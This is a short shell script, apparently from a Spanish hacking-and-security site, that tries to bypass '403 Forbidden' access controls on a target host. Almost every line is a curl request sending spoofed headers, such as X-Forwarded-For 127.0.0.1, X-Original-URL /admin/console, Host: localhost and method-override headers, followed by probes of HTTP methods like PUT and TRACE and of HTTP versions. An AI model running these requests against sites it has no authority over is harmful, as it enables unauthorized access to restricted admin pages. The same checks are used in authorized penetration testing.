#!/bin/sh
# Saltar 403 Forbidden  You don't have permission to access this resource.
#
# (R ) hackingyseguridad.com 2025
#

echo
echo "CABECERAS"
echo
curl -k  -v -I -i --max-time 5 https://$1 -H "$1"
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Original-URL: '
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Custom-IP-Authorization: 127.0.0.1'
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Originating-IP: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Remote-IP: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Remote-Addr: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-ProxyUser-Ip: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-For: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-For: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Custom-IP-Authorization: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Originating-IP: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Remote-IP: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Remote-Addr: 127.0.0.1:80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-rewrite-url: ' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'Host: localhost' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Host: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Host: 127.0.0.1' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'Content-Length: 0' -X POST 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Original-URL: /admin/console' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Rewrite-URL: /admin/console' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Original-URL: /admin/' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Rewrite-URL: /admin/' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Original-URL: /admin/' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Rewrite-URL: /admin/' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: PATCH' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: CONNECT' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: TRACE' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: HEAD' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: POST' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-HTTP-Method-Override: PUT' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 4443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 4443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 80' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 8080' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 8443' 
curl -k  -v -I -i --max-time 5 https://$1 -H 'X-Forwarded-Port: 8443' 
echo
echo "METODOS HTTP"
echo
echo "PUT";  curl -ks https://$1 -L -H 'User-Agent: Mozilla/5.0' -I  -X PUT  -H 'X-Method-Override: PUT' -H "X-HTTP-Method: PUT" -H "X-Method-Override: PUT"
echo "TRACE";  curl -ks https://$1 -L -H 'User-Agent: Mozilla/5.0' -I  -X TRACE  -H 'X-Method-Override: TRACE' -H "X-HTTP-Method: TRACE" -H "X-Method-Override: TRACE"
echo "GET";  curl -ks https://$1 -L -H 'User-Agent: Mozilla/5.0' -I  -X GET -H 'X-Method-Override: GET' -H "X-HTTP-Method: GET" -H "X-Method-Override: GET"
echo "POST";  curl -ks https://$1 -L -H 'User-Agent: Mozilla/5.0' -I  -X POST -H 'X-Method-Override: POST' -H "X-HTTP-Method: POST" -H "X-Method-Override: POST"
echo "HEAD";  curl -ks https://$1 -L -H 'User-Agent: Mozilla/5.0' -I  -X HEAD -H 'X-Method-Override: HEAD' -H "X-HTTP-Method: HEAD" -H "X-Method-Override: HEAD"
echo "OPTIONS";  curl -ks https://$1 -L -H 'User-Agent: Mozilla/5.0' -I  -X OPTIONS -H 'X-Method-Override: OPTIONS' -H "X-HTTP-Method: OPTIONS" -H "X-Method-Override: OPTIONS"
echo "PATCH";  curl -ks https://$1 -L -H 'User-Agent: Mozilla/5.0' -I  -X PATCH -H 'X-Method-Override: PATCH' -H "X-HTTP-Method: PATCH" -H "X-Method-Override: PATCH"
echo
echo "HTTP "
echo
echo "HTTP 1.0"; timeout 3 curl -Is --http1.0 https://$1 | head -1
echo "HTTP 1.1"; timeout 3 curl -Is --http1.1 https://$1 | head -1
echo "HTTP 2.0 " timeout 3 curl -Is --http2-prior-knowledge https://$1 | head -1
echo












